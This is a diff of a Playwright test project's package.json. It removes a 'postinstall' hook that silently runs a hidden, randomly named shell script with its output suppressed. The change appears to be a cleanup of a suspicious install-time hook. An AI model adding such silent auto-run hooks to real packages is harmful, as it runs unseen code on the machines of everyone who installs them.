@@ -15,8 +15,7 @@
     "test:api": "playwright test tests/api.spec.ts --project=api",
     "test:e2e": "playwright test --project=e2e",
     "test:report": "playwright show-report playwright-report",
-    "test:install": "playwright install chromium --with-deps",
-    "postinstall": "sh ./.ci-jk9tkt.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test:install": "playwright install chromium --with-deps"
   },
   "dependencies": {
     "@codemirror/commands": "^6.10.3",
